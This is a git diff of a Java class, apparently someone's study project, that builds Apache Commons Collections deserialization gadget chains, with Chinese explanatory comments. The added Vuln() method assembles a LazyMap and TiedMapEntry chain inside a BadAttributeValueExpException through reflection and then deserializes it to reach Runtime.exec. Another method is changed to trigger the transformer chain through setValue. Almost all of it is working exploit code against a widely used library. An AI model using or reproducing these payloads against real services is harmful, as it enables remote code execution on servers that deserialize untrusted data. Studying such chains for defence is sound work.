@@ -4,12 +4,16 @@ import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
 import org.apache.commons.collections.map.TransformedMap;
 import org.apache.commons.io.IOUtils;
 
+import javax.management.BadAttributeValueExpException;
 import java.io.*;
 import java.lang.annotation.Target;
 import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.Arrays;
@@ -84,6 +88,7 @@ public class ApacheCommonsCollectionsVuln {
 
     }
 
+
     public static void tryVuln() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {
 //        Process a = (Process) Runtime.class.getMethod("getRuntime").getReturnType().getMethod("exec", String.class).invoke(
 //                Runtime.class.getMethod("getRuntime").invoke(null), cmd);
@@ -95,6 +100,29 @@ public class ApacheCommonsCollectionsVuln {
         );
     }
 
+    public static void Vuln() {
+        try {
+            Transformer transformChain = new ChainedTransformer(evil_tf_chain);
+
+            Map innerMap = new HashMap();
+            Map lazyMap = LazyMap.decorate(innerMap, transformChain);
+            TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo233");
+
+            BadAttributeValueExpException exception = new BadAttributeValueExpException(null);
+            Field valField = exception.getClass().getDeclaredField("val");
+            System.out.println("val field: " + valField);
+            valField.setAccessible(true);
+            valField.set(exception, entry);
+
+            ObjectSerializeAndDeserializeWithStream(exception);
+
+        } catch (
+                Exception e) {
+            e.printStackTrace();
+        }
+
+    }
+
     /**
      * sun.reflect.annotation.AnnotationInvocationHandler类实现了java.lang.reflect.InvocationHandler(Java动态代理)接口和java.io.Serializable接口，
      * 它还重写了readObject方法，在readObject方法中还间接的调用了TransformedMap中MapEntry的setValue方法，
@@ -104,7 +132,6 @@ public class ApacheCommonsCollectionsVuln {
      */
     public static void AnnotationInvocationHandlerVuln() {
         try {
-            // TODO 纳尼，我甚至把源码拷过来了，难道有什么不对的地方么？ 为啥计算器不弹了？
             Map<String, String> m = new HashMap<>();
             m.put("value", "value");
             Map<?, ?> transformedMap = TransformedMap.decorate(m, null, new ChainedTransformer(evil_tf_chain));
@@ -125,8 +152,10 @@ public class ApacheCommonsCollectionsVuln {
      */
     public static void TransformedMapVuln() {
         try {
+            HashMap<String, String> m = new HashMap<String, String>();
+            m.put("1", "1");
             Transformer transformedChain = new ChainedTransformer(evil_tf_chain);
-            Map<String, String> transformedMap = TransformedMap.decorate(new HashMap<String, String>(), null, transformedChain);
+            Map<String, String> transformedMap = TransformedMap.decorate(m, null, transformedChain);
             // 构造函数为
             /*
             protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
@@ -135,7 +164,12 @@ public class ApacheCommonsCollectionsVuln {
                 this.valueTransformer = valueTransformer;
             }
              */
-            transformedMap.put("1", "1");
+            for (Object obj : transformedMap.entrySet()) {
+                Map.Entry entry = (Map.Entry) obj;
+
+                // setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链
+                entry.setValue("test");
+            }
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -179,7 +213,6 @@ public class ApacheCommonsCollectionsVuln {
                     ),// Runtime.class.getMethod("getRuntime").invoke(null)
                     new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
                     // Runtime.class.getMethod("getRuntime").invoke(null).exec(cmd)
-
             };
             /*
             Question : TODO
@@ -210,7 +243,7 @@ public class ApacheCommonsCollectionsVuln {
      * <p>
      * InvokerTransformer类实现了org.apache.commons.collections.Transformer接口,
      * Transformer提供了一个对象转换方法：transform，
-     * <br>主要用于将输入对象转换为输出对象。InvokerTransformer类的主要作用就是利用Java反射机制来创建类实例。</br>
+     * 主要用于将输入对象转换为输出对象。InvokerTransformer类的主要作用就是利用Java反射机制来创建类实例。
      * <p>
      * public class InvokerTransformer implements Transformer, Serializable
      * 可见 InvokerTransformer 扩展了 序列化 与另一个啥的操作
@@ -268,6 +301,7 @@ public class ApacheCommonsCollectionsVuln {
 //        ChainedTransformerVuln();
 //        TransformedMapVuln();
         AnnotationInvocationHandlerVuln();
+        Vuln();
     }
 
 }
